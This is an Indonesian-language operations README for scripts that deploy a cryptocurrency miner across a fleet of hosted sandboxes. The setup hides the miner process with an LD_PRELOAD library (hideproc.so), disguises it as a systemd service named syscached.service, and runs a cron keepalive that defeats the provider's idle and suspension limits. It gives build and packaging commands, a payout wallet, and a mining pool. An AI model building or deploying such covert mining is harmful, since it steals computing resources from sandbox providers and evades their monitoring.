# ops/instabox — kontrol fleet sandbox instabox.sh

Dipasang di vps1 (`~/.instabox/`). API key di `~/.instabox/env` (ibk_...).

- `sandbox-status.sh` — status sandbox: state, service miner, hashrate, shares, worker, sisa runtime 8 jam. Parsing mengikuti log backend CONN (`HR 854 H/s | A 0 R 0`).
- `instabox-keepalive.sh` — cron `*/5`: reset idle (30m), resume suspended, start stopped; log `~/.instabox/keepalive.log`.
- `sandbox-deploy.sh WORKER` — pasang miner CONN ke sandbox: `/usr/local/bin/xcb` + `librandomx_v2.so` + `hideproc.so` (LD_PRELOAD) + unit `syscached.service` + hugepages.

## Paket binary

Build sekali (di vps1 atau sandbox), lalu tar tiga file ini:

```bash
cmake -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build -j
make -C labs/process-hide
cp build/xcb build/librandomx_v2.so labs/process-hide/hideproc.so /tmp/instabox-pkg/
tar -C /tmp/instabox-pkg -czf instabox-pkg.tgz xcb librandomx_v2.so hideproc.so
```

Sebar ke sandbox via `instabox cp`, lalu jalankan `sandbox-deploy.sh <worker>`.

`librandomx_v2.so` **wajib** ada di `/usr/local/bin/` (sama dengan `xcb`) karena
binary memakai RPATH `$ORIGIN`. Skrip deploy mengecek `ldd` dan berhenti kalau
library tidak ter-resolve.

## Default deploy

| Env | Default |
|---|---|
| `WALLET` | `cc1p2mf0hyvm86vglrx6j3sq0hcxn7y8k2lt2fu8fzguv825j6epskxqtx8cmn` |
| `POOL` | `eu.rplant.xyz:17194` (TLS) |
| `THREADS` | `4` |
| `HUGEPAGES` | `1200` |

Worker diambil dari argumen (`sandbox-deploy.sh ai-workers-1` → `--worker ai-workers-1`).
